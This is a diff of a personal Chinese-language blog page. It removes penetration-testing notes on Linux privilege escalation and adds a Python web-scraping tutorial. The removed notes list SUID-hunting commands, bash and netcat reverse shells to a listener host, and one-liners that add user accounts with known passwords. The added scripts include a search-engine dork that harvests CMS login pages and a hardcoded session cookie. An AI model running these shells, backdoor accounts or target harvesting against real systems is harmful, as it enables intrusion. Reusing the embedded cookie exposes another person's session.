@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+<meta name="description" content="爬虫 bs4参考链接：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html  实例1：利用百度搜索接口，编写url采集器 import requests from bs4 import BeautifulSoup  headers={&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux提权">
-<meta property="og:url" content="http://wcute.github.io/2018/12/02/linux提权/index.html">
+<meta property="og:title" content="Hexo Test">
+<meta property="og:url" content="http://wcute.github.io/2018/12/09/python/Python3-学习（爬虫实例）/index.html">
 <meta property="og:site_name" content="Hexo Test">
-<meta property="og:description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+<meta property="og:description" content="爬虫 bs4参考链接：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html  实例1：利用百度搜索接口，编写url采集器 import requests from bs4 import BeautifulSoup  headers={&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T00:30:45.635Z">
+<meta property="og:updated_time" content="2018-12-09T03:49:51.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux提权">
-<meta name="twitter:description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+<meta name="twitter:title" content="Hexo Test">
+<meta name="twitter:description" content="爬虫 bs4参考链接：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html  实例1：利用百度搜索接口，编写url采集器 import requests from bs4 import BeautifulSoup  headers={&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/2018/12/02/linux提权/">
+  <link rel="canonical" href="http://wcute.github.io/2018/12/09/python/Python3-学习（爬虫实例）/">
 
 
 
 
 
-  <title>linux提权 | Hexo Test</title>
+  <title> | Hexo Test</title>
   
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/02/linux提权/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Python3-学习（爬虫实例）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -249,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">linux提权</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-02T20:25:53+08:00">
-                2018-12-02
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
+                2018-12-09
               </time>
             
 
@@ -299,77 +299,176 @@
       
 
       
-        <p>参考链接：<br><a href="https://www.tuicool.com/articles/NzMJRjm" target="_blank" rel="noopener">https://www.tuicool.com/articles/NzMJRjm</a><br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
-<p>在获取靶机<code>shell</code>之后，首先看一下是什么权限，权限低的话就要进行提权了</p>
-<p> 常规思路：</p>
-<ol>
-<li>检查漏洞系统的操作系统发行版<blockquote>
-<p>cat /etc/issue<br>cat /etc/*-release</p>
-</blockquote>
+        <h5 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h5><ul>
+<li><p>bs4参考链接：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html</a></p>
 </li>
-<li>查看内核版本(获取版本后可使用<code>kali</code>自带的<code>searcsploit</code>搜寻漏洞利用代码)<blockquote>
-<p>uname -a</p>
-</blockquote>
-</li>
-<li><p>检查可用的用户及当前用户的权限</p>
-<blockquote>
-<p>whoami</p>
-</blockquote>
-</li>
-<li><p>列出SUID文件（SUID目的是让本来没有相应权限的用户运行这个程序时可以访问没有权限访问的资源）</p>
-<blockquote>
-<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \;<br>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
-</blockquote>
-</li>
-</ol>
-<p>已知可以用来提权的linux可执行文件：<code>nmap</code> <code>vim</code> <code>find</code> <code>Bash</code> <code>More</code> <code>Less</code> <code>Nano</code> <code>cp</code></p>
-<ol start="5">
-<li>查看安装的包、程序、运行的服务。过时的版本可能存在漏洞。</li>
-</ol>
-<h4 id="Bash-反弹-shell"><a href="#Bash-反弹-shell" class="headerlink" title="Bash 反弹 shell"></a>Bash 反弹 shell</h4><p>bash 一句话反弹</p>
-<blockquote>
-<p>本地 nc -l -p 8080<br> 靶机 bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
-</blockquote>
-<pre><code>    命令                      命令详解
-bash -i               产生一个bash交互环境
-&gt;&amp;                    将联合符号前面的内容与后面相结合然后一起重定向给后者
-/dev/tcp/ip/端口      linux 环境中所有的内容都是以文件的形式存在的，让主机与目标主机ip:端口建立一个TCP连接 
-0&gt;&amp;1                  将 标准的输入 与 标准输出 内容相结合，然后重定向给前面  标准的输出 内容
-</code></pre><p>详细解读过程：<code>bash</code>产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
-<h4 id="Netcat-工具反弹"><a href="#Netcat-工具反弹" class="headerlink" title="Netcat 工具反弹"></a>Netcat 工具反弹</h4><ol>
-<li>开启外网主机监听<blockquote>
-<p>root@kali:~#nc -lvpp 4050</p>
-</blockquote>
-</li>
-<li>netcat 反弹一句话<blockquote>
-<p>靶机$：nc ip 端口 -t -e /bin/bash</p>
-</blockquote>
-</li>
-</ol>
-<p>通过靶机webshell使用nc命令建立一个<code>ip:端口</code>的会话连接，将本地shell通过这个会话反弹给目标主机</p>
-<h4 id="python-标准虚拟终端获取"><a href="#python-标准虚拟终端获取" class="headerlink" title="python 标准虚拟终端获取"></a>python 标准虚拟终端获取</h4><p>python一句话获取标准<code>shell</code></p>
-<blockquote>
-<p> python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
-</blockquote>
-<pre><code> 命令                                命令详解
- -c                       命令行执行 
-import pty                引入标准库pty           
-pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标准的shell
-</code></pre><h4 id="Linux-一句话添加账户"><a href="#Linux-一句话添加账户" class="headerlink" title="Linux 一句话添加账户"></a>Linux 一句话添加账户</h4><ol>
-<li>chpasswd 方法<blockquote>
-<p>useradd test;echo ‘test:123456’|chpasswd</p>
-</blockquote>
-</li>
-<li>useradd -p 方法<blockquote>
-<p>useradd -p `openssl passwd 123456` guest</p>
-</blockquote>
-</li>
-<li>echo -e 方法<blockquote>
-<p>useradd test;echo -e “123456n123456n” |passwd test</p>
-</blockquote>
-</li>
-</ol>
-<p><br><hr>其他的感觉不是经常使用，就没有再做笔记了</p>
+<li><p>实例1：利用百度搜索接口，编写url采集器</p>
+<pre><code>import requests
+from bs4 import BeautifulSoup
+
+headers={&apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&apos;}
+
+for i in range(1,100,10):
+    bd_search=&quot;https://www.baidu.com/s?wd=inurl:/dede/login.php?&amp;pn=%s&quot; %str(i)
+    r=requests.get(bd_search,headers=headers)
+    soup=BeautifulSoup(r.text,&quot;lxml&quot;)
+    url_list=soup.select(&quot;.t &gt; a&quot;)    # 获得所有class为t的标签
+    for url in url_list:
+        real_url=url[&quot;href&quot;]
+        r=requests.get(real_url)
+        print (r.url)
+</code></pre></li>
+<li><p>实例2： 爬取文章标题</p>
+<pre><code>import requests
+import re
+
+def get_article():
+    for x in range(1,59):
+        url=&quot;http://zone.secevery.com/sort_ytpe-new__day-0__is_recommend-0_page-&quot;
+        url=url+str(x)
+        resp=requests.get(url)
+        result=re.findall(br&apos;&lt;a href=&quot;http://zone.secevery.com/article/\d+&quot;&gt;(.*?)&lt;/a&gt;&apos;,resp.content)
+        for article in result:
+            print (article.decode(&apos;utf-8&apos;))
+
+if __name__==&apos;__main__&apos;:
+    get_article()
+</code></pre></li>
+<li><p>实例3： 爬取文章标题并写入文件</p>
+<pre><code>#-*-coding UTF_8 -*-
+import requests
+import re
+from bs4 import BeautifulSoup
+
+headers={
+    &apos;Host&apos;: &quot;zone.secevery.com&quot;,
+    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;,
+    &apos;Referer&apos;:&apos;https://www.baidu.com&apos;
+}
+
+def get_total_pages():
+    url=&apos;http://zone.secevery.com/&apos;
+    response=requests.get(url=url,headers=headers)
+    soup=BeautifulSoup(response.content,&apos;html.parser&apos;)
+
+    a=soup.find_all(&apos;a&apos;,href=re.compile(&apos;is_recommend-0__page-&apos;))
+    a=str(a[-1])
+    total_pages=a.split(&apos;-&apos;)[-1].split(&apos;&quot;&apos;)[0]
+    return  total_pages
+
+def get_total_titles(pages):
+    titles=[]
+    total_pages=int(pages)
+    for page in range(1,int(total_pages)):
+        url=&apos;http://zone.secevery.com/sort_type-new__day-0__is_recommend-0__page-%d&apos;%page
+        resp=requests.get(url=url,headers=headers)
+        soup=BeautifulSoup(resp.content,&apos;html.parser&apos;)
+        a = soup.find_all(&apos;a&apos;,href=re.compile(r&apos;com/article&apos;))
+        for i in a:
+            if i.string != &quot;查看全部&quot;:
+                titles.append(i.string)
+    return titles
+
+def write_txt(titles):
+    with open(&apos;title1.txt&apos;,&apos;w&apos;) as f:
+        for title in titles:
+            f.write(title+&apos;\n&apos;)
+
+if __name__==&apos;__main__&apos;:
+    print(&apos;-&apos;*60)
+    print(&quot;程序启动中......&quot;)
+    print(&apos;-&apos;*60)
+    pages=get_total_pages()
+    print(&quot;总页数为：%s&quot; % pages)
+    print(&apos;-&apos;*60)
+    print(&quot;正在获取数据，请稍后....&quot;)
+    titles=get_total_titles(pages)
+    print(&apos;文件正在写入,请稍后...&apos;)
+    print(&apos;-&apos;*60)
+    write_txt(titles)
+    print(&quot;well done!&quot;)
+</code></pre></li>
+<li><p>实例4：爬取补天公益SRC链接</p>
+<pre><code>import requests
+from requests.packages import urllib3
+from bs4 import BeautifulSoup
+# 项目大厅链接
+# https://butian.360.cn/Reward/plan
+
+# 厂商提交漏洞的链接
+# https://butian.360.cn/Loo/submit?cid=61101
+
+headers={
+    &quot;Host&quot;: &quot;butian.360.cn&quot;,
+    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;,
+    &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,
+    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
+    &quot;Referer&quot;: &quot;https://butian.360.cn/Reward/plan&quot;,
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+    &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
+    &quot;Content-Length&quot;: &quot;14&quot;,
+    &quot;Cookie&quot;: &quot;test_cookie_enable=null; __huid=108OHneOmn%2FGBQ%2BJukK2rK3j4HhKMHdLMfd%2BokoEYRQKE%3D; __guid=91251416.1657029331559520500.1512282503171.2822; __DC_gid=90162694.998847747.1523438745794.1537231453981.287; smidV2=201804121919226e10578a54cc4cce100543952a4e7b000018db7a8e1407320; Q=u%3D360H2620192781%26n%3D%26le%3D%26m%3DZGHlWGWOWGWOWGWOWGWOWGWOZwHm%26qid%3D2620192781%26im%3D1_t0105d6cf9b508f72c8%26src%3Dpcw_webscan%26t%3D1; T=s%3D8b8f0bc6b26203525eb9f114ee626b0e%26t%3D1536202563%26lm%3D%26lf%3D2%26sk%3Daa11fbae76d233eeabdcbbb8abdf885b%26mt%3D1536202563%26rc%3D%26v%3D2.0%26a%3D1; __gid=67796994.160790607.1526525535847.1528973038214.14; UM_distinctid=1636c03266b578-07963af4955a558-4c312a7a-144000-1636c03266c426; __DC_monitor_count=20; PHPSESSID=ingp9jlm0d9v5tosb2do8bs8u7; __q__=1537231281479; test_cookie_enable=null; __DC_sid=138613664.439132718304839230.1537229417384.1438; wzwsconfirm=732968041ce27324ddd8dcf54d958661; wzwstemplate=Mw==; wzwschallenge=-1; ccpassport=5a26b60aa93bd3303aea3061a756590d; wzwsvtime=1537230292&quot;,
+}
+
+data={
+    &quot;s&quot;:&quot;1&quot;,
+    &quot;p&quot;:&quot;1&quot;,
+    &quot;token&quot;:&quot;&quot;,
+    &quot;sort&quot;:&quot;1&quot;
+}
+
+urllib3.disable_warnings()    # 消除警告
+
+#获取厂商总页数
+def get_total_pages():
+    url=&quot;https://butian.360.cn/Reward/pub&quot;
+    resp=requests.post(url=url,headers=headers,data=data,verify=False)
+    company_info=resp.json()
+    total_pages=company_info[&apos;data&apos;][&apos;count&apos;]
+    return total_pages
+
+#获取厂商ID
+def get_all_company_id(total_pages):
+    company_id=[]
+    for x in range(1,int(total_pages)+1):
+        print (&quot;正在获取第%d页列表&quot; %x)
+        data[&apos;p&apos;]=x
+        url=&quot;https://butian.360.cn/Reward/pub&quot;
+        resp=requests.post(url=url,headers=headers,data=data,verify=False)
+        info=resp.json()
+        company_info=info[&apos;data&apos;][&apos;list&apos;]
+        for company in company_info:
+            company_id.append(company[&apos;company_id&apos;])
+    return company_id
+
+# 获取厂商域名
+def get_all_company_host(company_id):
+    hosts=[]
+    print (&quot;正在获取域名，请稍后&quot;)
+    for x in company_id:
+        url=&quot;https://butian.360.cn/Loo/submit?cid=%d&quot; % int(x)
+        resp=requests.get(url=url,headers=headers,data=data,verify=False)
+        soup=BeautifulSoup(resp.content,&quot;html.parser&quot;)
+        inp=soup.find_all(&apos;input&apos;)
+        print (inp[4][&apos;value&apos;])
+        hosts.append(inp[4][&apos;value&apos;])
+    return hosts
+
+# 写入txt文件
+def write(hosts):
+    with open(&apos;butian_spider.text&apos;,&apos;w&apos;) as f:
+        for url in hosts:
+            f.write(url+&apos;\n&apos;)
+
+if __name__==&quot;__main__&quot;:
+    total_pages=get_total_pages()
+    company_id=get_all_company_id(total_pages)
+    hosts=get_all_company_host(company_id)
+    print (&quot;正在写入文件&quot;)
+    write(hosts)
+    print (&quot;成功写入&quot;)
+</code></pre></li>
+</ul>
 
       
     </div>
@@ -394,14 +493,18 @@ pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/12/09/python/Django---简单博客搭建（2）/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/03/web安全/index/" rel="prev" title="web安全">
-                web安全 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/09/python/Django--（Models）/" rel="prev" title="">
+                 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -516,7 +619,7 @@ pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标�
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bash-反弹-shell"><span class="nav-number">1.</span> <span class="nav-text">Bash 反弹 shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat-工具反弹"><span class="nav-number">2.</span> <span class="nav-text">Netcat 工具反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-标准虚拟终端获取"><span class="nav-number">3.</span> <span class="nav-text">python 标准虚拟终端获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-一句话添加账户"><span class="nav-number">4.</span> <span class="nav-text">Linux 一句话添加账户</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#爬虫"><span class="nav-number">1.</span> <span class="nav-text">爬虫</span></a></li></ol></div>
             
 
           </div>
